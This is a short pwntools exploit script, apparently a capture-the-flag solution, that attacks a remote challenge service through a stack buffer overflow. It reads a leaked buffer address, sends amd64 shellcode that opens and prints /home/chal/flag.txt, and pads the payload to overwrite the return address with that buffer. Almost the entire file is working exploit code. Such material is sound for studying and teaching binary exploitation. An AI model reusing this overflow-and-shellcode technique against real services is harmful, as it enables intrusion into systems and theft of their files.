from pwn import *

isremote = True
if isremote:
    r = remote("23.146.248.233", 20003)
else:
    r = process("./src/chal")
context.arch = 'amd64'

buffer_address = int(r.recvline().split()[2], 16)
print("Buffer addr:" + str(hex(buffer_address)))
r.recvuntil("Please enter your name: ")

raw_input('>')
shellcode = asm(
    shellcraft.pushstr("/home/chal/flag.txt")+
    shellcraft.open('rsp', 0, 0)+
    shellcraft.read('rax', 'rsp', 0x30)+
    shellcraft.write(1, 'rsp', 0x30)     
)
print(len(shellcode))
print(hex(buffer_address))
r.sendline(shellcode+'a'*47+p64(buffer_address)) # offset = 120 - len(shellcode)

r.interactive()


